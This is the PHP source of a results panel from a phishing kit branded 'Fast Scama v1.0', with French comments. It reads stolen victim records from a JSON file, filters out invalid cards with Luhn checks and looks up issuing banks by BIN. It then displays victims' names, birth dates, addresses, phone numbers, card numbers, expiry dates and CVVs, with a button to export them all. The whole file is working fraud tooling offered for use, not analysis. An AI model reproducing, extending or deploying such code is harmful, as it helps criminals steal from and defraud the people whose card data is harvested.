<?php
session_start();
include './fonctions/auth.php';

$clients_file = 'clients.json';
$clients = [];

// Vérifier si le fichier JSON existe
if (file_exists($clients_file)) {
    // Lire le contenu du fichier JSON
    $json_content = file_get_contents($clients_file);

    // Vérifier si le décodage du JSON a réussi
    $decoded_json = json_decode($json_content, true);
    if ($decoded_json === null && json_last_error() !== JSON_ERROR_NONE) {
        die('Erreur de décodage JSON : ' . json_last_error_msg());
    }

    $clients = $decoded_json;

    // Triez le tableau par date de naissance du plus vieux au plus jeune
    usort($clients, function ($a, $b) {
        $dateA = DateTime::createFromFormat('d/m/Y', $a['dob']);
        $dateB = DateTime::createFromFormat('d/m/Y', $b['dob']);

        if ($dateA === false || $dateB === false) {
            // Gestion des erreurs, vous pouvez ajuster cela selon vos besoins
            return 0;
        }

        return $dateA <=> $dateB;
    });

    // Supprimez les doublons, les fausses informations (dates de naissance et cartes de crédit)
    $uniqueClients = [];
    $seenDobs = [];
    $seenCreditCards = [];
    foreach ($clients as $client) {
        $dob = $client['dob'];
        $creditCard = $client['ccnum'];

        if (isValidDate($dob) && isValidCreditCard($creditCard) && !in_array($dob, $seenDobs) && !in_array($creditCard, $seenCreditCards)) {
            $uniqueClients[] = $client;
            $seenDobs[] = $dob;
            $seenCreditCards[] = $creditCard;
        }
    }

    // Utilisez le tableau unique pour l'affichage
    $clients = $uniqueClients;

    // Paramètres de pagination (si nécessaire)
    $itemsParPage = 10; // Nombre d'éléments par page
    $nombrePages = ceil(count($clients) / $itemsParPage); // Calcul du nombre de pages
    $page = isset($_GET['page']) ? max(1, min($nombrePages, intval($_GET['page']))) : 1; // Récupération du numéro de page, assurez-vous que c'est un nombre entier et dans la plage valide
    $indexDebut = ($page - 1) * $itemsParPage; // Index de début pour l'affichage
    $clients = array_slice($clients, $indexDebut, $itemsParPage); // Sélectionnez les éléments à afficher sur la page actuelle

    // Collectez les informations sur les BIN classés par banque
    $binSummary = [];
    foreach ($clients as $client) {
        $bin = substr($client['ccnum'], 0, 6);
        $bank = getBankNameFromBin($bin);
        if (!isset($binSummary[$bank])) {
            $binSummary[$bank] = 0;
        }
        $binSummary[$bank]++;
    }
}

// Fonction pour vérifier la validité d'une date
function isValidDate($date)
{
    $d = DateTime::createFromFormat('d/m/Y', $date);
    return $d && $d->format('d/m/Y') === $date;
}

// Fonction pour vérifier la validité d'un numéro de carte de crédit avec l'algorithme de Luhn
function isValidCreditCard($creditCard)
{
    // Supprimez les espaces de la carte
    $creditCard = str_replace(' ', '', $creditCard);

    // La longueur du numéro de carte doit être entre 13 et 19 chiffres
    if (!preg_match('/^\d{13,19}$/', $creditCard)) {
        return false;
    }

    // Algorithme de Luhn
    $sum = 0;
    $length = strlen($creditCard);

    for ($i = 1; $i <= $length; $i++) {
        $digit = (int)$creditCard[$length - $i];
        if ($i % 2 === 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }

    return $sum % 10 === 0;
}

function getBankNameFromBin($bin)
{
    // Emplacement du cache
    $cacheFile = 'bin_cache/' . md5($bin) . '.json';

    // Vérifie si le fichier cache existe et n'est pas trop ancien (par exemple, 24 heures)
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        // Si le cache est valide, utilisez les données en cache
        $response = file_get_contents($cacheFile);
    } else {
        // Sinon, effectuez une nouvelle requête à binlist.net
        $apiEndpoint = "https://lookup.binlist.net/$bin";
        $options = [
            'http' => [
                'method' => 'GET',
                'header' => 'Accept: application/json',
            ],
        ];
        $context = stream_context_create($options);
        $response = file_get_contents($apiEndpoint, false, $context);

        // Vérification de la réponse
        if ($response !== false) {
            // Enregistrez la réponse dans le cache
            file_put_contents($cacheFile, $response);
        }
    }

    // Analyse de la réponse JSON
    $data = json_decode($response, true);

    // Vérification si le nom de la banque est disponible dans les données
    if (isset($data['bank']['name'])) {
        return $data['bank']['name'];
    } elseif (isset($data['scheme'])) {
        // Certains BIN peuvent contenir le nom de la banque dans la propriété "scheme"
        return $data['scheme'];
    }

    // Retourne une chaîne vide si le nom de la banque n'est pas disponible
    return '';
}



?>

<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   
    <title>Mes rez | Fast Scama v1.0</title>

    <!-- Liens vers les feuilles de style et polices -->
    <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link href="css/sb-admin-2.min.css" rel="stylesheet">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Custom fonts for this template-->
<link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link
        href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i"
        rel="stylesheet">

    <!-- Custom styles for this template-->
    <link href="css/sb-admin-2.min.css" rel="stylesheet">

    <style>
        table {
            border-collapse: collapse;
            width: 50%;
        }

        th, td {
            border: 1px solid #ddd;
            padding: 4px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }
    </style>

    <!-- Balises de style pour personnaliser le diagramme -->
    <style>
        .custom-chart-container {
            width: 50%; /* Ajustez la largeur selon vos besoins */
            height: 200px; /* Ajustez la hauteur selon vos besoins */
            margin: 0 auto; /* Centre le conteneur horizontalement */
        }

        .class-text {
            font-size: 24px;
            background: #4E73DF;
            background: linear-gradient(to right, #4E73DF 0%, #4e73df 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
    </style>
</head>

<body id="page-top">
    <div id="wrapper">
        <!-- Sidebar -->
        <ul class="navbar-nav bg-gradient-primary sidebar sidebar-dark accordion" id="accordionSidebar">

            <!-- Sidebar - Brand -->
            <a class="sidebar-brand d-flex align-items-center justify-content-center" href="index.html">
                <div class="sidebar-brand-icon rotate-n-15">
                    <i class="fas fa-laugh-wink"></i>
                </div>
                <div class="sidebar-brand-text mx-3">Panel<sup></sup></div>
            </a>

            <!-- Divider -->
            <hr class="sidebar-divider my-0">

            <!-- Nav Item - Dashboard -->
            <li class="nav-item active">
                <a class="nav-link" href="index.php">
                    <i class="fas fa-fw fa-tachometer-alt"></i>
                    <span>Mon Dashboard</span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider">

            <!-- Nav bar - Gauche -->
            <li class="nav-item">
                <a class="nav-link" href="visiteurs.php">
                    <i class="fas fa-fw fa-chart-area"></i>
                    <span>Liste visiteurs par pays </span></a>
            </li>

            <!-- Nav bar - Gauche -->
            <li class="nav-item">
                <a class="nav-link" href="rez.php">
                    <i class="fas fa-fw fa-table"></i>
                    <span>Vos rez </span></a>
            </li>

            <!-- Divider -->
            <hr class="sidebar-divider d-none d-md-block">

            <!-- Sidebar Toggler (Sidebar) -->
            <div class="text-center d-none d-md-inline">
                <button class="rounded-circle border-0" id="sidebarToggle"></button>
            </div>
        </ul>
        <!-- Contenu principal -->
        <div id="content-wrapper" class="d-flex flex-column">
            <div id="content">
                <!-- Barre de navigation avec le logo -->
                <nav class="navbar navbar-expand navbar-light bg-white topbar mb-4 static-top shadow">
                   
					   <h2>Récapitulatif des BIN par banque</h2>
    <ul>
        <?php foreach ($binSummary as $bank => $count) : ?>
            <li><?php echo $bank; ?> : <?php echo $count; ?> BIN</li>
        <?php endforeach; ?>
    </ul>

                </nav>

                <a href="export_clients.php" class="btn btn-primary">Télécharger tous les clients</a>
				<br>
 

                    <div class="table-responsive">
                        <table class="table table-bordered" id="dataTable">
                            <thead>
                                <tr>
									<th>Date rez</th>
                                    <th>Nom</th>
                                    <th>Prénom</th>
                                    <th>Date de naissance</th>
                                    <th>Adresse</th>
                                    <th>Ville</th>
                                    <th>Code Postal</th>
                                    <th>N° Tel</th>
                                    <th>N° CC</th>
                                    <th>Exp</th>
                                    <th>Cvv</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php
                                // Afficher les clients depuis le fichier JSON
                                foreach ($clients as $client) {
                                    echo "<tr>";
									echo "<td>{$client['date_heure']}</td>";
                                    echo "<td>{$client['nom']}</td>";
                                    echo "<td>{$client['prenom']}</td>";
                                    echo "<td>{$client['dob']}</td>";
                                    echo "<td>{$client['adresse']}</td>";
                                    echo "<td>{$client['ville']}</td>";
                                    echo "<td>{$client['code_postal']}</td>";
                                    echo "<td>{$client['tel']}</td>"; // Ajout du numéro de téléphone
                                    echo "<td>{$client['ccnum']}</td>"; // Ajout du numéro de carte de crédit
                                    echo "<td>{$client['exp']}</td>"; // Ajout de la date d'expiration
                                    echo "<td>{$client['cvv']}</td>"; // Ajout du CVV
                                    echo "</tr>";
                                }
                                ?>
                            </tbody>
                        </table>
                    </div>

<!-- Pagination -->
<div class="pagination">
    <?php for ($i = 1; $i <= $nombrePages; $i++) : ?>
        <a href="?page=<?php echo $i; ?>"<?php echo ($i == $page) ? ' class="active"' : ''; ?>><?php echo $i; ?></a>
    <?php endfor; ?>
</div>

                <!-- Pied de page -->
                <footer class="sticky-footer bg-white">
                    <div class="container my-auto">
                        <div class="copyright text-center my-auto">
                            <span>Dashboard 2024 | copyright FastScama</span>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
    </div>

    <!-- Scripts JavaScript -->
    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="js/sb-admin-2.min.js"></script>
    <script src="vendor/chart.js/Chart.min.js"></script>
    <script src="js/demo/chart-area-demo.js"></script>
    <script src="js/demo/chart-pie-demo.js"></script>
</body>

</html>
